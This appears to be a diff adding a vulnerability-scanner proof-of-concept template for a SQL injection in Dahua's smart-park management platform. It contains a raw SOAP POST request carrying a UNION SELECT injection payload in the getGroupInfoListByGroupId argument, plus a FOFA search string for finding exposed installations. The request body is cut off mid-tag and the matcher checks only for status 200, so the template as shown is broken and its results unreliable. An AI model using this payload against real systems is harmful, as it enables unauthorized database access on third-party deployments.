@@ -1,0 +1,21 @@
+id: poc-sdrud2k4grxlito4
+info:
+  name: 大华智慧园区综合管理平台clientServer存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/sdrud2k4grxlito4
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: sqli,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: sdrud2k4grxlito4
+    fofa: app="dahua-智慧园区综合管理平台"
+http:
+- raw:
+  - "POST /portal/services/clientServer HTTP/1.1\nHost:xxx\nUser-Agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36\nContent-Type: text/xml;charset=UTF-8\n\n<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:cli=\"http://clientServer.webservice.dssc.dahua.com\">\n  <soapenv:Header/>\n  <soapenv:Body>\n  <cli:getGroupInfoListByGroupId>\n    <!--type: string-->\n      <arg0>-5398) UNION ALL SELECT 5336,5336,5336,5336,md5(123456)-- -</arg0>\n    <!--type: long-->\n    <arg1>10</arg1>\n    </cli:getGroupInfoListByGroupId>\n    </soapenv:Body>\n  </soapenv:E"
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
